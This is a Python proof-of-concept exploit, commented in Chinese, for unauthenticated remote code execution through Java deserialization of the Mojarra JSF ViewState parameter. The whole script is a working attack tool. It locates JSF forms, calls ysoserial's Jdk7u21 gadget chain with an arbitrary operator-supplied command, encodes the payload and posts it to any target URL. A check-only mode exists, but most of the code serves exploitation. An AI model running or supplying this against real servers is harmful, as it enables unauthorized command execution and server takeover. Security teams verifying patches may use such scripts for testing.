#!/usr/bin/env python3
"""
Mojarra JSF ViewState 反序列化RCE漏洞 POC
适用版本: Mojarra < 2.1.29-08 / < 2.0.11-04

==================== 漏洞描述 ====================
【漏洞原理】
Mojarra JSF框架在2.1.29-08和2.0.11-04之前版本未对ViewState进行加密。
攻击者可构造恶意的序列化Java对象作为javax.faces.ViewState参数提交，
利用ysoserial的Jdk7u21 gadget链触发反序列化实现RCE。
需JDK 7u21或更低版本。

【影响范围】
- Mojarra < 2.1.29-08
- Mojarra < 2.0.11-04
- 需JDK 7u21
- 端口: 8080

【危害等级】
- 无需认证
- CVSS评分: 9.8 (Critical)

==================== 环境要求 ====================
- Python 3.6+
- requests库
- 前置: ysoserial工具 (生成Jdk7u21 payload)

==================== 验证步骤 ====================
1. 基础检测:
   python mojarra_jsf_viewstate_rce.py http://target:8080 --check-only

2. 完整利用(需ysoserial):
   python mojarra_jsf_viewstate_rce.py http://target:8080 -c "touch /tmp/success"
   python mojarra_jsf_viewstate_rce.py http://target:8080 --payload <base64_gzip_payload>

==================== 预期结果 ====================
- 成功时: ViewState反序列化触发命令执行
- 失败时: 无法访问JSF页面或ViewState已加密
"""

import sys
import json
import base64
import gzip
import argparse
import requests
import subprocess
import re
import os
from typing import Dict, Optional
from urllib.parse import urljoin, unquote, quote


class MojarraJSFViewStatePOC:
    """Mojarra JSF ViewState反序列化RCE漏洞 POC"""

    VULN_NAME = "Mojarra JSF ViewState Deserialization RCE"
    CVE_ID = "N/A (Mojarra < 2.1.29-08 / < 2.0.11-04)"
    SEVERITY = "CRITICAL (CVSS 9.8)"
    AFFECTED = "Mojarra < 2.1.29-08 / < 2.0.11-04 with JDK <= 7u21"

    def __init__(self, target: str, timeout: int = 15, proxy: str = None,
                 verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl
        self.form_action = None

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def _find_form_action(self, session: requests.Session) -> Optional[str]:
        """从JSF页面提取form action"""
        try:
            resp = session.get(self.target, timeout=self.timeout)
            if resp.status_code != 200:
                return None
            # 查找JSF表单action
            patterns = [
                r'action="([^"]*)"',
                r'action=\'([^\']*)\'',
                r'<form[^>]*action="([^"]*)"',
                r'<form[^>]*action=\'([^\']*)\'',
                r'javax\.faces\.ViewState'
            ]
            for pattern in patterns:
                matches = re.findall(pattern, resp.text, re.IGNORECASE)
                if matches:
                    # 找到ViewState说明是JSF页面
                    if 'ViewState' in resp.text:
                        # 使用第一个action
                        for m in matches:
                            if m.startswith('/') or m.startswith('http'):
                                return m
                            elif m.strip():
                                return urljoin(self.target, m)
            return None
        except Exception:
            return None

    def check(self) -> Dict:
        """
        步骤1: 检查JSF服务状态
        步骤2: 检测JSF表单是否存在
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }
        session = self._create_session()

        print("[*] 步骤1/2: 检查JSF服务状态...")
        try:
            resp = session.get(self.target, timeout=self.timeout)
            if resp.status_code == 200:
                print(f"[+] JSF服务正常 (HTTP {resp.status_code})")
                result["details"].append(f"HTTP {resp.status_code}")
            else:
                result["details"].append(f"状态码: {resp.status_code}")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"服务不可达: {e}"
            return result

        print("[*] 步骤2/2: 检测JSF表单和ViewState...")
        self.form_action = self._find_form_action(session)
        if self.form_action:
            print(f"[+] 找到JSF表单: {self.form_action}")
            result["details"].append(f"表单action: {self.form_action}")
            result["status"] = "suspected_vulnerable"
            result["conclusion"] = (
                "JSF页面存在ViewState表单，可能受反序列化漏洞影响。\n"
                "完整利用需使用ysoserial生成Jdk7u21 payload:\n"
                "  java -jar ysoserial-all.jar Jdk7u21 \"touch /tmp/success\" | gzip | base64\n"
                "  python mojarra_jsf_viewstate_rce.py <target> --payload <base64_gzip_payload>"
            )
        else:
            result["status"] = "not_vulnerable"
            result["conclusion"] = "未检测到JSF表单或ViewState"

        return result

    def _find_ysoserial(self) -> Optional[str]:
        for p in ["./ysoserial-all.jar", "/tmp/ysoserial-all.jar", "ysoserial.jar"]:
            if os.path.exists(p):
                return p
        return None

    def _generate_payload(self, command: str) -> Optional[str]:
        """使用ysoserial生成Jdk7u21 payload并gzip+base64编码"""
        ysoserial = self._find_ysoserial()
        if not ysoserial:
            return None
        try:
            # 生成payload
            proc = subprocess.run(
                ["java", "-jar", ysoserial, "Jdk7u21", command],
                capture_output=True, timeout=30
            )
            if proc.returncode != 0:
                return None
            raw = proc.stdout
            # gzip压缩
            compressed = gzip.compress(raw)
            # base64编码
            return base64.b64encode(compressed).decode()
        except Exception:
            return None

    def exploit(self, command: str = "touch /tmp/success") -> Dict:
        """
        利用ViewState反序列化执行命令
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "command": command,
            "status": "exploiting",
            "details": [],
            "conclusion": ""
        }
        session = self._create_session()

        if not self.form_action:
            self.form_action = self._find_form_action(session)
        if not self.form_action:
            result["status"] = "failed"
            result["conclusion"] = "无法找到JSF表单action"
            return result

        print(f"[*] 生成Jdk7u21 payload (命令: {command})...")
        b64_payload = self._generate_payload(command)
        if not b64_payload:
            result["conclusion"] = (
                "无法生成payload，请手动生成:\n"
                "  java -jar ysoserial-all.jar Jdk7u21 \"<command>\" | gzip | base64 -w 0\n"
                "  python mojarra_jsf_viewstate_rce.py <target> --payload <base64_payload>"
            )
            return result

        return self._send_payload(b64_payload, session)

    def _send_payload(self, b64_payload: str, session: requests.Session = None) -> Dict:
        """发送ViewState payload到JSF表单"""
        if not session:
            session = self._create_session()
        if not self.form_action:
            self.form_action = self._find_form_action(session)

        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "status": "exploited",
            "details": [f"Payload长度: {len(b64_payload)} chars"],
            "conclusion": ""
        }

        # URL编码payload
        urlencoded = quote(b64_payload, safe='')

        form_url = urljoin(self.target, self.form_action) if self.form_action else self.target
        data = {
            "javax.faces.ViewState": urlencoded
        }

        print(f"[*] 发送ViewState payload到: {form_url}")
        try:
            resp = session.post(form_url, data=data, timeout=self.timeout)
            result["http_status"] = resp.status_code
            result["details"].append(f"HTTP {resp.status_code}")
            result["details"].append(f"响应长度: {len(resp.content)}")
            result["output"] = resp.text[:500]
            result["conclusion"] = (
                "ViewState反序列化payload已发送。\n"
                "如JDK版本和Mojarra版本符合条件，命令已在服务器执行"
            )
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"请求异常: {e}"

        return result

    def run(self, command: str = "touch /tmp/success") -> Dict:
        print(f"[*] {self.VULN_NAME} - 开始验证")
        print(f"[*] 目标: {self.target}")
        print(f"[*] 严重等级: {self.SEVERITY}")
        print("-" * 60)
        return self.exploit(command)

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]", "suspected_vulnerable": "[?]",
                 "failed": "[-]", "not_vulnerable": "[-]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        if result.get("http_status"):
            print(f"    HTTP: {result['http_status']}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="Mojarra JSF ViewState反序列化RCE漏洞验证POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python mojarra_jsf_viewstate_rce.py http://target:8080 --check-only
  python mojarra_jsf_viewstate_rce.py http://target:8080 -c "touch /tmp/success"
  python mojarra_jsf_viewstate_rce.py http://target:8080 --payload <base64_gzip_payload>

前置条件:
  -c 模式需要ysoserial-all.jar (Jdk7u21 gadget)
  --payload 模式需要先手动生成payload:
    java -jar ysoserial-all.jar Jdk7u21 "id" | gzip | base64 -w 0
        """
    )
    parser.add_argument("target", help="目标URL (e.g., http://192.168.1.100:8080)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("-c", "--command", default="touch /tmp/success", help="要执行的命令")
    parser.add_argument("--payload", help="base64+gzip编码的ysoserial Jdk7u21 payload")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    poc = MojarraJSFViewStatePOC(
        target=args.target, timeout=args.timeout,
        proxy=args.proxy, verify_ssl=not args.insecure
    )

    if args.check_only:
        result = poc.check()
    elif args.payload:
        result = poc._send_payload(args.payload)
    elif args.command:
        result = poc.run(args.command)
    else:
        result = poc.check()

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
